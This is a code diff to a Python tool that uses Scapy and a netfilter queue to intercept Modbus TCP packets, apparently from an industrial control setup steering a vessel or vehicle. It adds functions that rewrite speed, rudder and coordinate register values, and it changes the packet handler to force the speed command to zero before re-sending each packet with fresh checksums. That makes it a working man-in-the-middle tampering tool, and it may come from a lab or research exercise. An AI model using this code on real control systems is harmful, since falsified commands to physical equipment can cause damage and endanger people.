@@ -48,8 +48,28 @@ class mb:
     def get_speed(pkt):
         return mb.get_commands(pkt)[0]
 
+    def set_speed(pkt, new):
+        if not mb.is_commands(pkt):
+            return False
+        mbl = pkt.getlayer(ModbusADUResponse)
+        pl = getattr(mbl, "payload", "?")
+        rv = getattr(pl, "registerVal", "?")
+        rv[0] = new
+        setattr(pl, "registerVal", rv)
+        return pkt
+
     def get_rudder(pkt):
         return mb.get_commands(pkt)[1]
+
+    def set_rudder(pkt, new):
+        if not mb.is_commands(pkt):
+            return False
+        mbl = pkt.getlayer(ModbusADUResponse)
+        pl = getattr(mbl, "payload", "?")
+        rv = getattr(pl, "registerVal", "?")
+        rv[1] = new
+        setattr(pl, "registerVal", rv)
+        return pkt
 
 
 
@@ -67,6 +87,14 @@ class mb:
         mbl = pkt.getlayer(ModbusADURequest)
         pl = getattr(mbl, "payload", "?")
         return getattr(pl, "registerValue", "?")
+
+    def set_coords(pkt, new):
+        if not mb.is_coord(pkt):
+            return False
+        mbl = pkt.getlayer(ModbusADURequest)
+        pl = getattr(mbl, "payload", "?")
+        setattr(pl, "registerValue", new)
+        return pkt
     
     def is_x(pkt):
         if not mb.is_coord(pkt):
@@ -160,7 +188,7 @@ class mb:
                 s = mb.get_speed(pkt)
                 if convert:
                     s = (s/4095.0) * 5.0
-                    out += f"{s:>1.4}"
+                    out += f"{s:>6.4f}"
                 else:
                     out += f"{s:>6}"
             else:
@@ -203,30 +231,38 @@ class net_filter_queue:
                     
                         
         
-        if  pl.haslayer("Write Single Register"): 
-            print("Write register cache is:", pl['Write Single Register'].raw_packet_cache)  
-            print("Write register is:", pl['Write Single Register'])
-        
-        
-        '''
-        elif pl.haslayer("Read Holding Registers Response"):
-            print("Register response is:", pl['Read Holding Registers Response'].registerVal)
-            print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
-        #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
-            pload2=pl['Read Holding Registers Response'].registerVal
-        
-            pload2[0]=7
-            print('payload2 is ',pload2)
-        #pl['Write Single Register'].remove_payload
-            pl['Read Holding Registers Response'].registerVal=pload2
-            print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
-            del pl[TCP].chksum
-            del pl[IP].chksum
-            packet.set_payload(bytes(pl))
-            #packet.drop()
-            pl.show() 
+        # if  pl.haslayer("Write Single Register"): 
+        #     print("Write register cache is:", pl['Write Single Register'].raw_packet_cache)  
+        #     print("Write register is:", pl['Write Single Register'])
+        if mb.is_commands(pl):
             
-        '''    
+            pl = mb.set_speed(pl, 0)
+
+        if mb.is_modbus(pl):
+
+            mb.print_scannable(pl, convert=True)
+        
+        # elif pl.haslayer("Read Holding Registers Response"):
+        #     print("Register response is:", pl['Read Holding Registers Response'].registerVal)
+        #     print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
+        # #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
+        #     pload2=pl['Read Holding Registers Response'].registerVal
+        
+        #     pload2[0]=7
+        #     print('payload2 is ',pload2)
+        # #pl['Write Single Register'].remove_payload
+        #     pl['Read Holding Registers Response'].registerVal=pload2
+        #     print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
+
+
+        del pl[TCP].chksum
+        del pl[IP].chksum
+        # packet.set_payload(bytes(pl))
+
+        #     #packet.drop()
+        #     pl.show() 
+            
+      
         
         #pl.show()  
         scapy.send(pl)
